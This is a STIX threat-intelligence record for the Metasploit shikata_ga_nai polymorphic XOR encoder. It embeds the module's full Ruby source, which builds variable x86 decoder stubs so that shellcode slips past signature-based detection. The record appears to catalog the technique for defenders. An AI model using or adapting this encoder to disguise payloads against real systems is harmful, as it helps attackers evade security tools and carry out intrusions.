{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c792860-4927-4edd-9fca-f5d23583a01e",
    "created": "2024-08-14T16:33:19.212236Z",
    "modified": "2024-08-14T16:33:19.21224Z",
    "name": "Polymorphic XOR Additive Feedback Encoder",
    "description": " This encoder implements a polymorphic XOR additive feedback encoder. The decoder stub is generated based on dynamic instruction substitution and dynamic block ordering.  Registers are also selected dynamically. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/shikata_ga_nai.rb",
            "external_id": "shikata_ga_nai.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/poly'\n\nclass MetasploitModule < Msf::Encoder::XorAdditiveFeedback\n\n  # The shikata encoder has an excellent ranking because it is polymorphic.\n  # Party time, excellent!\n  Rank = ExcellentRanking\n\n  def initialize\n    super(\n      'Name'             => 'Polymorphic XOR Additive Feedback Encoder',\n      'Description'      => %q{\n        This encoder implements a polymorphic XOR additive feedback encoder.\n        The decoder stub is generated based on dynamic instruction\n        substitution and dynamic block ordering.  Registers are also\n        selected dynamically.\n      },\n      'Author'           => 'spoonm',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4\n        })\n  end\n\n  #\n  # Generates the shikata decoder stub.\n  #\n  def decoder_stub(state)\n\n    # If the decoder stub has not already been generated for this state, do\n    # it now.  The decoder stub method may be called more than once.\n    if (state.decoder_stub == nil)\n\n      # Sanity check that saved_registers doesn't overlap with modified_registers\n      if (modified_registers & saved_registers).length > 0\n        raise BadGenerateError\n      end\n\n      # Shikata will only cut off the last 1-4 bytes of it's own end\n      # depending on the alignment of the original buffer\n      cutoff = 4 - (state.buf.length & 3)\n      block = generate_shikata_block(state, state.buf.length + cutoff, cutoff) || (raise BadGenerateError)\n\n      # Set the state specific key offset to wherever the XORK ended up.\n      state.decoder_key_offset = block.index('XORK')\n\n      # Take the last 1-4 bytes of shikata and prepend them to the buffer\n      # that is going to be encoded to make it align on a 4-byte boundary.\n      state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf\n\n      # Cache this decoder stub.  The reason we cache the decoder stub is\n      # because we need to ensure that the same stub is returned every time\n      # for a given encoder state.\n      state.decoder_stub = block\n    end\n\n    state.decoder_stub\n  end\n\n  # Indicate that this module can preserve some registers\n  def can_preserve_registers?\n    true\n  end\n\n  # A list of registers always touched by this encoder\n  def modified_registers\n    # ESP is assumed and is handled through preserves_stack?\n    [\n      # The counter register is hardcoded\n      Rex::Arch::X86::ECX,\n      # These are modified by div and mul operations\n      Rex::Arch::X86::EAX, Rex::Arch::X86::EDX\n    ]\n  end\n\n  # Always blacklist these registers in our block generation\n  def block_generator_register_blacklist\n    [Rex::Arch::X86::ESP, Rex::Arch::X86::ECX] | saved_registers\n  end\n\nprotected\n\n  #\n  # Returns the set of FPU instructions that can be used for the FPU block of\n  # the decoder stub.\n  #\n  def fpu_instructions\n    fpus = []\n\n    0xe8.upto(0xee) { |x| fpus << \"\\xd9\" + x.chr }\n    0xc0.upto(0xcf) { |x| fpus << \"\\xd9\" + x.chr }\n    0xc0.upto(0xdf) { |x| fpus << \"\\xda\" + x.chr }\n    0xc0.upto(0xdf) { |x| fpus << \"\\xdb\" + x.chr }\n    0xc0.upto(0xc7) { |x| fpus << \"\\xdd\" + x.chr }\n\n    fpus << \"\\xd9\\xd0\"\n    fpus << \"\\xd9\\xe1\"\n    fpus << \"\\xd9\\xf6\"\n    fpus << \"\\xd9\\xf7\"\n    fpus << \"\\xd9\\xe5\"\n\n    # This FPU instruction seems to fail consistently on Linux\n    #fpus << \"\\xdb\\xe1\"\n\n    fpus\n  end\n\n  #\n  # Returns a polymorphic decoder stub that is capable of decoding a buffer\n  # of the supplied length and encodes the last cutoff bytes of itself.\n  #\n  def generate_shikata_block(state, length, cutoff)\n    # Declare logical registers\n    count_reg = Rex::Poly::LogicalRegister::X86.new('count', 'ecx')\n    addr_reg  = Rex::Poly::LogicalRegister::X86.new('addr')\n    key_reg = nil\n\n    if state.context_encoding\n      key_reg = Rex::Poly::LogicalRegister::X86.new('key', 'eax')\n    else\n      key_reg = Rex::Poly::LogicalRegister::X86.new('key')\n    end\n\n    # Declare individual blocks\n    endb = Rex::Poly::SymbolicBlock::End.new\n\n    # Clear the counter register\n    clear_register = Rex::Poly::LogicalBlock.new('clear_register',\n      \"\\x31\\xc9\",  # xor ecx,ecx\n      \"\\x29\\xc9\",  # sub ecx,ecx\n      \"\\x33\\xc9\",  # xor ecx,ecx\n      \"\\x2b\\xc9\")  # sub ecx,ecx\n\n    # Initialize the counter after zeroing it\n    init_counter = Rex::Poly::LogicalBlock.new('init_counter')\n\n    # Divide the length by four but ensure that it aligns on a block size\n    # boundary (4 byte).\n    length += 4 + (4 - (length & 3)) & 3\n    length /= 4\n\n    if (length <= 255)\n      init_counter.add_perm(\"\\xb1\" + [ length ].pack('C'))\n    elsif (length <= 65536)\n      init_counter.add_perm(\"\\x66\\xb9\" + [ length ].pack('v'))\n    else\n      init_counter.add_perm(\"\\xb9\" + [ length ].pack('V'))\n    end\n\n    # Key initialization block\n    init_key = nil\n\n    # If using context encoding, we use a mov reg, [addr]\n    if state.context_encoding\n      init_key = Rex::Poly::LogicalBlock.new('init_key',\n        Proc.new { |b| (0xa1 + b.regnum_of(key_reg)).chr + 'XORK'})\n    # Otherwise, we do a direct mov reg, val\n    else\n      init_key = Rex::Poly::LogicalBlock.new('init_key',\n        Proc.new { |b| (0xb8 + b.regnum_of(key_reg)).chr + 'XORK'})\n    end\n\n    xor  = Proc.new { |b| \"\\x31\" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }\n    add  = Proc.new { |b| \"\\x03\" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }\n\n    sub4 = Proc.new { |b| sub_immediate(b.regnum_of(addr_reg), -4) }\n    add4 = Proc.new { |b| add_immediate(b.regnum_of(addr_reg), 4) }\n\n    if (datastore[\"BufferRegister\"])\n\n      buff_reg = Rex::Poly::LogicalRegister::X86.new('buff', datastore[\"BufferRegister\"])\n      offset = (datastore[\"BufferOffset\"] ? datastore[\"BufferOffset\"].to_i : 0)\n      if ((offset < -255 or offset > 255) and state.badchars.include? \"\\x00\")\n        raise EncodingError.new(\"Can't generate NULL-free decoder with a BufferOffset bigger than one byte\")\n      end\n      mov = Proc.new { |b|\n        # mov <buff_reg>, <addr_reg>\n        \"\\x89\" + (0xc0 + b.regnum_of(addr_reg) + (8 * b.regnum_of(buff_reg))).chr\n      }\n      add_offset = Proc.new { |b| add_immediate(b.regnum_of(addr_reg), offset) }\n      sub_offset = Proc.new { |b| sub_immediate(b.regnum_of(addr_reg), -offset) }\n\n      getpc = Rex::Poly::LogicalBlock.new('getpc')\n      getpc.add_perm(Proc.new{ |b| mov.call(b) + add_offset.call(b) })\n      getpc.add_perm(Proc.new{ |b| mov.call(b) + sub_offset.call(b) })\n\n      # With an offset of less than four, inc is smaller than or the same size as add\n      if (offset > 0 and offset < 4)\n        getpc.add_perm(Proc.new{ |b| mov.call(b) + inc(b.regnum_of(addr_reg))*offset })\n      elsif (offset < 0 and offset > -4)\n        getpc.add_perm(Proc.new{ |b| mov.call(b) + dec(b.regnum_of(addr_reg))*(-offset) })\n      end\n\n      # NOTE: Adding a perm with possibly different sizes is normally\n      # wrong since it will change the SymbolicBlock::End offset during\n      # various stages of generation.  In this case, though, offset is\n      # constant throughout the whole process, so it isn't a problem.\n      getpc.add_perm(Proc.new{ |b|\n        if (offset < -255 or offset > 255)\n          # lea addr_reg, [buff_reg + DWORD offset]\n          # NOTE: This will generate NULL bytes!\n          \"\\x8d\" + (0x80 + b.regnum_of(buff_reg) + (8 * b.regnum_of(addr_reg))).chr + [offset].pack('V')\n        elsif (offset > -255 and offset != 0 and offset < 255)\n          # lea addr_reg, [buff_reg + byte offset]\n          \"\\x8d\" + (0x40 + b.regnum_of(buff_reg) + (8 * b.regnum_of(addr_reg))).chr + [offset].pack('c')\n        else\n          # lea addr_reg, [buff_reg]\n          \"\\x8d\" + (b.regnum_of(buff_reg) + (8 * b.regnum_of(addr_reg))).chr\n        end\n      })\n\n      # BufferReg+BufferOffset points right at the beginning of our\n      # buffer, so in contrast to the fnstenv technique, we don't have to\n      # sub off any other offsets.\n      xor1 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - cutoff) ].pack('c') }\n      xor2 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - 4 - cutoff) ].pack('c') }\n      add1 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - cutoff) ].pack('c') }\n      add2 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - 4 - cutoff) ].pack('c') }\n\n    else\n      # FPU blocks\n      fpu = Rex::Poly::LogicalBlock.new('fpu',\n        *fpu_instructions)\n\n      fnstenv = Rex::Poly::LogicalBlock.new('fnstenv',\n        \"\\xd9\\x74\\x24\\xf4\")\n      fnstenv.depends_on(fpu)\n\n      # Get EIP off the stack\n      getpc = Rex::Poly::LogicalBlock.new('getpc',\n        Proc.new { |b| (0x58 + b.regnum_of(addr_reg)).chr })\n      getpc.depends_on(fnstenv)\n\n      # Subtract the offset of the fpu instruction since that's where eip points after fnstenv\n      xor1 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }\n      xor2 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }\n      add1 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }\n      add2 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }\n    end\n\n    # Decoder loop block\n    loop_block = Rex::Poly::LogicalBlock.new('loop_block')\n\n    loop_block.add_perm(\n      Proc.new { |b| xor1.call(b) + add1.call(b) + sub4.call(b) },\n      Proc.new { |b| xor1.call(b) + sub4.call(b) + add2.call(b) },\n      Proc.new { |b| sub4.call(b) + xor2.call(b) + add2.call(b) },\n      Proc.new { |b| xor1.call(b) + add1.call(b) + add4.call(b) },\n      Proc.new { |b| xor1.call(b) + add4.call(b) + add2.call(b) },\n      Proc.new { |b| add4.call(b) + xor2.call(b) + add2.call(b) })\n\n    # Loop instruction block\n    loop_inst = Rex::Poly::LogicalBlock.new('loop_inst',\n      \"\\xe2\\xf5\")\n      # In the current implementation the loop block is a constant size,\n      # so really no need for a fancy calculation.  Nevertheless, here's\n      # one way to do it:\n      #Proc.new { |b|\n      #\t# loop <loop_block label>\n      #\t# -2 to account for the size of this instruction\n      #\t\"\\xe2\" + [ -2 - b.size_of(loop_block) ].pack('c')\n      #})\n\n    # Define block dependencies\n    clear_register.depends_on(getpc)\n    init_counter.depends_on(clear_register)\n    loop_block.depends_on(init_counter, init_key)\n    loop_inst.depends_on(loop_block)\n\n    begin\n      # Generate a permutation saving the ECX, ESP, and user defined registers\n      loop_inst.generate(block_generator_register_blacklist, nil, state.badchars)\n    rescue RuntimeError, EncodingError => e\n      # The Rex::Poly block generator can raise RuntimeError variants\n      raise EncodingError, e.to_s\n    end\n  end\n\n  # Convert the SaveRegisters to an array of x86 register constants\n  def saved_registers\n    Rex::Arch::X86.register_names_to_ids(datastore['SaveRegisters'])\n  end\n\n  def sub_immediate(regnum, imm)\n    return \"\" if imm.nil? or imm == 0\n    if imm > 255 or imm < -255\n      \"\\x81\" + (0xe8 + regnum).chr + [imm].pack('V')\n    else\n      \"\\x83\" + (0xe8 + regnum).chr + [imm].pack('c')\n    end\n  end\n  def add_immediate(regnum, imm)\n    return \"\" if imm.nil? or imm == 0\n    if imm > 255 or imm < -255\n      \"\\x81\" + (0xc0 + regnum).chr + [imm].pack('V')\n    else\n      \"\\x83\" + (0xc0 + regnum).chr + [imm].pack('c')\n    end\n  end\n  def inc(regnum)\n    [0x40 + regnum].pack('C')\n  end\n  def dec(regnum)\n    [0x48 + regnum].pack('C')\n  end\nend\n"
}